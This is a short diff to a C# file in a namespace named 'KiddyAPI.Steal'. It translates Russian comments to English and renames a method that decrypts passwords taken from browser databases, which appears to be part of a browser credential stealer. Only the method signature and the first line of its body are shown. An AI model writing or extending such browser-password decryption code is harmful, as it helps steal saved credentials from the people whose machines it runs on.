@@ -18,10 +18,10 @@ namespace KiddyAPI.Steal
         /// <summary>
         /// Расшифровка паролей
         /// </summary>
-        /// <param name="cipherTextBytes">Пароль, полученный из БД</param>
-        /// <param name="entropyBytes">Энтропия(null)</param>
-        /// <returns>Возвращает массив байтов </returns>
-        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
+        /// <param name="cipherTextBytes">Password from DB</param>
+        /// <param name="entropyBytes">(null)</param>
+        /// <returns>Return byte array.If password not decrypt return byte[0]</returns>
+        public static byte[] DecryptPasswordsFormBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
         {
             // Тут создаем BLOB'ы
             DataBlob pPlainText = new Browsers.DataBlob();
